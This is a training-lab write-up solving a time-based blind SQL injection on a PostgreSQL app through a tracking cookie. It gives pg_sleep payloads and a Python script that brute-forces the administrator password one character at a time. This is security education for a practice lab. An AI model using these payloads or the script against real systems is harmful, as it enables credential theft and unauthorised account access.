# Lab: Blind SQL injection with time delays and information retrieval
## Task
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution
Firstly, I found this payload worked:  
```
'||(SELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```
> The database is PostgreSQL.  


Then, with the following payload, I knew that the password's length is 20:  
```
'||(SELECT+CASE+WHEN(LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```  

Next, the payload to figure out each letter is:  
```
'||(SELECT+CASE+WHEN(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

Script:  
```python
import requests
import string
import time
from concurrent import futures
from concurrent.futures import ThreadPoolExecutor

URL = 'https://acab1f961f04ecd68015019c00fc00c0.web-security-academy.net/filter?category=Lifestyle'
alphas = list(string.ascii_lowercase)
alphas.extend(list(string.ascii_uppercase))
alphas.extend(list(string.digits))

def brute(i):
    for j in alphas:
        print(f"\r{(i, j)}", end="")
        COOKIES =  {'TrackingId':f"HDE8HzOmqiPAyRBY'||(SELECT+CASE+WHEN(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END)--",
        'session':'zborbpfMUYHP1DUkgOtF1WID4ymPSr9G'}
        start = time.perf_counter()
        resp = requests.get(URL, cookies=COOKIES)
        elapsed = time.perf_counter() - start
        if elapsed > 2:
            return j

res = []
for i in range(1, 21):
    res.append(brute(i))
print(''.join(res))
```

Run script:
```
(env) PS E:\CTF> py .\intruder.py
(20, '0')x0mvpsnoq9ayf567jms0
```

Login:  

![image](https://user-images.githubusercontent.com/44528004/130177303-92b50ce6-4548-4ed7-a86f-f6041d3d44d3.png)  


![image](https://user-images.githubusercontent.com/44528004/130177354-9cc83e05-6e01-4ed0-a4ad-e464f081d128.png)
> Solved!
